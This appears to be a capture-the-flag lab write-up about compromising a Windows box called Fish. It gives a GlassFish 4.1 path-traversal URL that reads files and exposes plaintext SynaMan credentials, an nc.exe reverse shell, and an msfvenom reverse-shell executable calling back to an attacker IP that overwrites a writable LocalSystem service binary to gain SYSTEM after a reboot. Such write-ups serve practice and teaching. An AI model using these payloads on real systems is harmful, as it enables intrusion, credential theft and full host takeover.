##### Tags: `glassfish`  `SynaMan`  `powerup`  `sc qc`  `.xml`

# 🪟 Fish 🪟
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.159.168

Not shown: 65459 closed tcp ports (reset), 52 filtered tcp ports (no-response)
PORT      STATE SERVICE              VERSION
135/tcp   open  msrpc                Microsoft Windows RPC
139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server        Microsoft Terminal Services
3700/tcp  open  giop
4848/tcp  open  http                 Sun GlassFish Open Source Edition  4.1
5040/tcp  open  unknown
6060/tcp  open  x11?
7676/tcp  open  java-message-service Java Message Service 301
7776/tcp  open  java-rmi             Java RMI
8080/tcp  open  http                 Sun GlassFish Open Source Edition  4.1
8181/tcp  open  ssl/http             Sun GlassFish Open Source Edition  4.1
8686/tcp  open  java-rmi             Java RMI
```
most of the port are unable to connect  
port 4848 is running Oracle GlassFish Server 4.1  
there is a script can read file remotely  
https://www.exploit-db.com/exploits/39441
```console
http://192.168.159.168:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
CMCDLLNAME32=mapi32.dll
CMC=1
MAPIX=1
MAPIXVER=1.0.0.1
OLEMessaging=1
[MCI Extensions.BAK]
```
port 6060 is running SynaMan 5.1  
found the credential in SynaMan/config/AppConfig.xml
```console
http://192.168.159.168:4848/theme/META-INF/json%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afSynaMan/config/AppConfig.xml
```
and we got arthur KingOfAtlantis
```console
<parameter name="smtpUser" type="1" value="arthur"/>
<parameter name="smtpPassword" type="1" value="KingOfAtlantis"/>
```
login to RDP and upload nc.exe to get a reverse shell
```console
$ penelope -p 443          
[+] Listening for reverse shells on 0.0.0.0:443 →  127.0.0.1 • 10.0.2.15 • 192.168.45.209
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from FISHYYY 192.168.159.168 Microsoft_Windows_10_Pro-x64-based_PC 👤 fishyyy\arthur • Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1] • Shell Type Readline • Menu key Ctrl-D ⇐
[+] Logging to /home/ming/.penelope/sessions/FISHYYY~192.168.159.168-Microsoft_Windows_10_Pro-x64-based_PC/2026_04_06-22_00_53-461.log
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\Users\arthur\Desktop>whoami
whoami
fishyyy\arthur
```
## Privilege Escalation
upload powerup and found there is a domain1 service running by LocalSystem
```console
ServiceName                     : domain1
Path                            : C:\glassfish4\glassfish\domains\domain1\bin\domain1Service.exe
ModifiableFile                  : C:\glassfish4\glassfish\domains\domain1\bin\domain1Service.exe
ModifiableFilePermissions       : {Delete, WriteAttributes, Synchronize, ReadControl...}
ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'domain1'
CanRestart                      : False
Name                            : domain1
Check                           : Modifiable Service Files
```
we have write permission to the .exe file
```console
C:\glassfish4\glassfish\domains\domain1\bin>icacls domain1Service.exe
icacls domain1Service.exe
domain1Service.exe BUILTIN\Administrators:(I)(F)
                   NT AUTHORITY\SYSTEM:(I)(F)
                   BUILTIN\Users:(I)(RX)
                   NT AUTHORITY\Authenticated Users:(I)(M)
```
the service will auto start when computer start
```console
C:\glassfish4\glassfish\domains\domain1\bin>sc qc domain1
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: domain1
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\glassfish4\glassfish\domains\domain1\bin\domain1Service.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : domain1 GlassFish Server
        DEPENDENCIES       : tcpip
        SERVICE_START_NAME : LocalSystem
```
so we will put a reverse shell name domain1Service.exe and restart the computer to trigger the payload  
payload
```console
$ msfvenom -p windows/shell_reverse_tcp lhost=192.168.45.209 lport=139 -f exe > domain1Service.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```
upload to the location and restart the computer
```console
shutdown /r /t 0
```
after restart we will get the system shell
```console
$ penelope -p 139          
[+] Listening for reverse shells on 0.0.0.0:139 →  127.0.0.1 • 10.0.2.15 • 192.168.45.209
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from FISHYYY 192.168.159.168 Microsoft_Windows_10_Pro-x64-based_PC 👤 nt authority\system • Assigned SessionID <1>                                                                                            
[+] Added readline support...
[+] Interacting with session [1] • Shell Type Readline • Menu key Ctrl-D ⇐
[+] Logging to /home/ming/.penelope/sessions/FISHYYY~192.168.159.168-Microsoft_Windows_10_Pro-x64-based_PC/2026_04_06-22_19_03-163.log                                                                                              
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\WINDOWS\system32>whoami
whoami
nt authority\system
```
